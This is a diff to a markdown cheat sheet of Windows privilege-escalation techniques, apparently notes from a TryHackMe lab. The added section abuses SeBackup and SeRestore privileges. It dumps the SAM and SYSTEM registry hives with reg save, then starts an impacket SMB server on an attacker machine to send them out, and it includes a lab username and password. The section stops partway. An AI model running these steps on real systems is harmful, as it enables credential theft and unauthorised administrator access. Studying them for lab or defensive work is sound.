@@ -28,6 +28,8 @@
 
 [Priv2Admin](https://github.com/gtworek/Priv2Admin)
 
+[impacket](https://github.com/fortra/impacket)
+
 ## Basic-Enumeration ✅
 ```powershell
 hostname
@@ -241,6 +243,27 @@ sc start "THMService" # cmd
 sc.exe stop "THMService" # powershell
 sc.exe start "THMService" # powershell
 ```
+# Privilege Escalation with Account(user) Access Privileges ✅
+
+> [!Note]
+> 🔹 Access Privileges in Windows are licenses that allow a system to do systemic tasks. These licenses can vary from simple (such as off -system shutdown) to very sensitive (such as ignoring security controls).
+
+## Privilege Escalation with The SeBackup and SeRestore privileges allow ✅
+
+> [!Note]
+> The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
+```powershell
+0️⃣ Once on the command prompt, we can check our privileges
+whoami /priv
+1️⃣ To backup the SAM and SYSTEM hashes, and Extraction of SAM and System Registry Files  
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+2️⃣ Transfer the extracted files to the invading system, To send these files to the Kali Linux system, we use SMB Server with impacket Tools  .
+mkdir share
+sudo python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+
+
+
 
 ## Credentials ✅
 ## File-Unattended ✅
